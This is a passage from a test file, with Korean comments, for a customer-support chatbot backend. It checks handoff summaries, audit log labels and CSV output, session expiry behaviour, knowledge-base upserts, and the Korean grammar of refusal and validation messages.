 * DS 22-4 — 이관 요약이 「어디로 회신해야 하는가」를 지어내지 않는다.
 * 요약 생성은 채널을 언제나 'web' 로 적어 왔다 — 카카오톡에서 온 접수도 홈페이지라고 말했다.
 * 채널을 아는 곳은 세션이므로, 세션에 남은 값을 그대로 따라가는지 실행해서 본다.
 */
test('이관 요약의 채널은 세션이 말하는 대로 적는다 (DS 22-4)', opts, async () => {
  const SESSION_GROUP = ['chat', 'session', 'handoff', 'intents', 'rules', 'escalation', 'adminStore', 'knowledge', 'normalize', 'storage', 'slots', 'tenantKB', 'tenants', 'llm'];
  const pick = (name) => importLib(name, SESSION_GROUP.filter((n) => n !== name));
  const { replyTo } = await pick('chat');
  const { updateSession, resetSessions } = await pick('session');
  const esc = await pick('escalation');

  for (const [channel, expected] of [[null, '홈페이지'], ['kakao', '카카오톡']]) {
    resetSessions();
    esc.resetTickets();
    const sid = `rt-ch-${channel ?? 'web'}`;
    if (channel) updateSession(sid, { channel });
    const r = replyTo('상담원 연결해 주세요', sid);
    assert.equal(r.escalate, true, '상담원 전환이 일어나야 이 검증이 의미가 있다');
    const ticket = esc.listTickets()[0];
    assert.ok(ticket?.summary, '티켓에 이관 요약이 붙지 않았다');
    assert.ok(ticket.summary.includes(expected), `${channel ?? 'web'}: 요약이 ${expected} 라고 말하지 않는다\n${ticket.summary.split('\n')[0]}`);
    if (channel === 'kakao') assert.equal(ticket.summary.includes('홈페이지'), false, '카카오 접수를 홈페이지라고 말한다');
  }
  resetSessions();
  esc.resetTickets();
});

/** DS 22-3 — 감사 로그 CSV·목록이 작업을 이름으로 말한다(엑셀로 여는 파일이다). */
test('감사 로그가 작업을 이름으로 말한다 (DS 22-3)', opts, async () => {
  const audit = await importLib('audit');
  audit.resetAudit();
  try {
    audit.logAudit({ action: 'partner.upsert', target: 'PTR-0001', detail: '등록: 가온파트너스', authed: true });
    audit.logAudit({ action: 'settlement.export', target: '2026-09', detail: 'CSV 내려받기', authed: false });

    // 목록(화면이 그대로 그리는 값)
    for (const e of audit.listAudit(10)) {
      assert.equal(/[A-Za-z]/.test(audit.auditActionLabel(e.action)), false, `${e.action}: 표시명에 영문이 섞였다`);
    }
    assert.equal(audit.auditActionLabel('partner.upsert'), '파트너 등록·수정');
    assert.equal(audit.auditActionLabel('settlement.export'), '정산 리포트 내려받기');
    // 옛 스냅샷에서 복원된 모르는 코드도 코드로 내보내지 않는다.
    assert.equal(audit.auditActionLabel('someone.new'), '관리 작업');

    const csv = audit.auditToCsv();
    const [header, first] = csv.split('\r\n');
    assert.equal(header, '번호,시각,작업,작업코드,대상,내용,인증', '열 이름이 받는 사람의 말이 아니다');
    assert.ok(first.includes('파트너 등록·수정'), `작업 이름이 빠졌다: ${first}`);
    assert.ok(first.includes('partner.upsert'), '옮겨 담을 코드 열이 빠졌다');
    assert.ok(first.includes('로그인됨'), '인증 여부가 true/false 로 남았다');
  } finally {
    audit.resetAudit();
  }
});

/* ══════════ 디자인 스프린트 — 21차 재감사 (DS 24-3) ══════════ */

/**
 * DS 24-3 — 문맥이 지워진 뒤에 적은 답은 **폼의 답이 아니라 새 질문**이 된다.
 *
 * 위젯이 「한동안 비워 둔 대화」를 알아보고 먼저 밝혀야 하는 이유가 여기 있다. 서버가 30분 뒤
 * 세션 문맥을 지우면(`lib/session.ts`), 화면에 「예약 접수 1/3 · 예약자 성함」 카드가 그대로
 * 떠 있어도 「홍길동」은 폼의 답으로 읽히지 않는다 — 손님은 이름을 잘못 적었다고 생각하고
 * 같은 말을 되풀이한다. 「정말 그렇게 되는가」는 돌려 봐야 안다.
 */
test('세션 문맥이 사라지면 폼의 답이 새 질문이 된다 (DS 24-3)', opts, async () => {
  const SESSION_GROUP = ['chat', 'session', 'handoff', 'intents', 'rules', 'escalation', 'adminStore', 'knowledge', 'normalize', 'storage', 'slots', 'tenantKB', 'tenants', 'llm'];
  const pick = (name) => importLib(name, SESSION_GROUP.filter((n) => n !== name));
  const { replyTo } = await pick('chat');
  const { resetSessions } = await pick('session');

  const sid = 'rt-stale-form';
  resetSessions();
  const start = replyTo('예약하고 싶어요', sid);
  assert.ok(start.form, '예약 접수 폼이 시작되지 않았다 — 이 검증의 전제가 깨졌다');
  assert.equal(start.form.step, 1);

  // ① 문맥이 살아 있으면 다음 단계로 간다(정상 흐름).
  const next = replyTo('홍길동', sid);
  assert.ok(next.form, '이어서 답했는데 폼이 끊겼다');
  assert.equal(next.form.step, 2, '성함을 받고도 다음 항목으로 가지 않는다');

  // ② 자리를 비운 사이 서버가 문맥을 지운 상태(TTL 경과 뒤의 `sweep()` 과 같다).
  resetSessions();
  const stale = replyTo('홍길동', sid);
  assert.equal(stale.form, undefined, '문맥이 없는데도 폼이 이어지는 척한다');
  assert.equal(stale.intent, 'fallback', `폼의 답이 새 질문으로 떨어지지 않는다: ${stale.intent}`);
  // 손님이 받는 말은 「무슨 말인지 모르겠다」 — 왜 그런지는 화면이 미리 밝혀 줘야 한다(위젯 DS 24-3).
  assert.ok(stale.reply.includes('이해하지 못했'), `돌아오는 안내가 바뀌었다: ${stale.reply}`);
  resetSessions();
});

/* ══════════ 디자인 스프린트 — 24차 재감사 (DS 27-3) ══════════ */

/**
 * DS 27-3 — 없는 식별자로 저장하면 서버는 **새로 만든다**.
 *
 * 그래서 자료를 지운 뒤 편집 폼을 거두지 않으면 「수정 저장」이 지운 자료를 되살리고, 화면은
 * 「수정되었습니다」라고 말한다(폼은 여전히 수정 모드다) — 변경 이력에는 「생성」으로 남아
 * 둘이 어긋난다. 콘솔 쪽 거두기가 **왜** 필요한지는 이 계약을 돌려 봐야 드러난다.
 */
test('없는 식별자로 저장하면 지운 자료가 되살아난다 (DS 27-3 근거)', opts, async () => {
  process.env.ADMIN_PERSIST = 'false'; // 테스트가 로컬 파일을 건드리지 않게 한다
  const store = await importLib('adminStore', ['knowledge', 'normalize']);

  const entry = { id: 'ds27-ghost', category: '요금', question: '이용료가 얼마인가요?', keywords: ['요금'], answer: '월 9만원입니다.' };
  assert.equal(store.upsertKB(entry).created, true, '전제: 새 자료가 만들어져야 한다');
  assert.equal(store.deleteKB('ds27-ghost'), true, '전제: 삭제되어야 한다');

  // 운영자가 지운 자료를 수정 중이던 폼이 그대로 남아 있었다면, 「수정 저장」은 이 요청을 보낸다.
  const again = store.upsertKB({ ...entry, answer: '월 9만원입니다. (수정)' });
  assert.equal(again.ok, true);
  assert.equal(again.created, true, '서버는 없는 식별자를 수정하지 않는다 — 새로 만든다');
  assert.ok(store.listKB().some((e) => e.id === 'ds27-ghost'), '지운 자료가 되살아나지 않았다면 이 검증의 전제가 깨졌다');

  store.deleteKB('ds27-ghost');
});

/* ══════════ 디자인 스프린트 — 26차 재감사 (DS 29-x) ══════════ */

/**
 * DS 29-3 — 거절 문장을 쓰는 한 곳(`src/lib/refusal.ts`)을 **실제로 돌린다**.
 * 소스 검사만으로는 「조사가 맞게 붙는가」·「이름 없는 키가 코드 키를 흘리지 않는가」를 못 본다.
 */
test('거절 문장이 받침에 맞는 조사로 쓰인다 (DS 29-3)', opts, async () => {
  const R = await importLib('refusal', []);

  // 받침 있음 → 은/을/이 · 받침 없음 → 는/를/가
  assert.equal(R.josa('문서 본문', '은', '는'), '문서 본문은');
  assert.equal(R.josa('카테고리', '은', '는'), '카테고리는');
  assert.equal(R.josa('문서명', '을', '를'), '문서명을');
  assert.equal(R.josa('연락처', '을', '를'), '연락처를');
  assert.equal(R.josa('이름', '이', '가'), '이름이');
  assert.equal(R.josa('방문 희망일', '이', '가'), '방문 희망일이');
  // 한글이 아닌 끝 글자·빈 값에서도 괄호를 남기지 않는다(판정 불가 → 받침 없는 쪽).
  assert.equal(R.josa('CSV', '은', '는'), 'CSV는');
  assert.equal(R.josa('', '은', '는'), '는');
  for (const w of ['문서명', '연락처', 'CSV', '']) {
    assert.equal(/[()]/.test(R.josa(w, '은', '는')), false, `조사 괄호가 남았다: ${w}`);
  }
});

test('거절 문장은 이름 있는 칸만 이름으로 부른다 (DS 29-3)', opts, async () => {
  const R = await importLib('refusal', []);

  // 화면에 그 칸이 있는 자리 — 라벨과 같은 말로 부른다.
  assert.equal(R.requiredMessage('title'), '문서명을 입력해 주세요.');
  assert.equal(R.tooLongMessage('text', 100000), '문서 본문은 100,000자까지 적을 수 있습니다.');
  assert.equal(R.tooLongMessage('reply', 1000), '답변은 1,000자까지 적을 수 있습니다.');
  assert.equal(R.notTextMessage('contact'), '연락처 칸에는 글자만 적을 수 있습니다.');

  // 사용자가 적은 적도 없는 자리 — 이름을 말하지 않는다. 코드 키가 새어 나오면 안 된다.
  for (const key of ['sessionId', 'citation', 'tenant', 'scenarioId', 'id', 'intent', 'verdict', 'kind']) {
    assert.equal(R.fieldLabel(key), null, `${key} 에는 화면 이름이 없어야 한다`);
    for (const msg of [R.requiredMessage(key), R.tooLongMessage(key, 60), R.notTextMessage(key)]) {
      assert.equal(msg.includes(key), false, `거절 문장에 코드 키가 새어 나왔다: ${msg}`);
      assert.equal(/[A-Za-z_]{2,}/.test(msg), false, `거절 문장에 영문 토큰이 남았다: ${msg}`);
    }
  }
});

test('고객에게 되묻는 말에 조사 괄호가 없다 (DS 29-3)', opts, async () => {
  const S = await importLib('slots', ['normalize', 'handoff', 'kst', 'refusal']);
  const slot = { key: 'name', label: '이름', kind: 'text', hint: '예: 홍길동', required: true };
  const dateSlot = { key: 'visitAt', label: '방문 희망일', kind: 'datetime', hint: '예: 내일 오후 3시', required: true };

  const empty = S.validateSlot(slot, '   ');
  assert.equal(empty.ok, false);
  assert.ok(empty.message.startsWith('이름을 입력해 주세요.'), `되묻는 말이 바뀌었다: ${empty.message}`);

  const short = S.validateSlot(slot, '김');
  assert.equal(short.ok, false);
  assert.ok(short.message.startsWith('이름을 조금 더'), short.message);

  const tooLong = S.validateSlot(slot, '가'.repeat(S.MAX_SLOT_VALUE_LEN + 1));
  assert.equal(tooLong.ok, false);
  assert.ok(tooLong.message.startsWith('이름이 너무 길어요'), tooLong.message);

  // 받침 없는 라벨도 같은 문을 지난다.
  const badDate = S.validateSlot(dateSlot, '아무때나');
  assert.equal(badDate.ok, false);
  for (const m of [empty.message, short.message, tooLong.message, badDate.message]) {
    assert.equal(/을\(를\)|이\(가\)|은\(는\)/.test(m), false, `괄호 조사가 남았다: ${m}`);
  }
});

test('접수 상태·대상 거절 문장에 코드 어휘가 없다 (DS 29-3)', opts, async () => {
  const E = await importLib('escalation', ['handoff', 'storage', 'refusal']);

  const gone = E.updateTicket('ESC-없는번호', { status: 'done' });
  assert.equal(gone.ok, false);
  assert.equal(/티켓/.test(gone.error), false, `내부 어휘가 남았다: ${gone.error}`);
  assert.match(gone.error, /목록을 새로 불러온 뒤/, '다음에 할 일을 말해야 한다');

  const { ticket } = E.createTicket({ sessionId: 's-29', reason: 'user_request', message: '사람 바꿔 주세요' });
  const bad = E.updateTicket(ticket.id, { status: 'ESCALATED' });
  assert.equal(bad.ok, false);
  assert.equal(/상태값|open|in_progress/.test(bad.error), false, `허용값 목록이 새어 나왔다: ${bad.error}`);
  assert.match(bad.error, /목록에서 다시 골라/, '다음에 할 일을 말해야 한다');
});
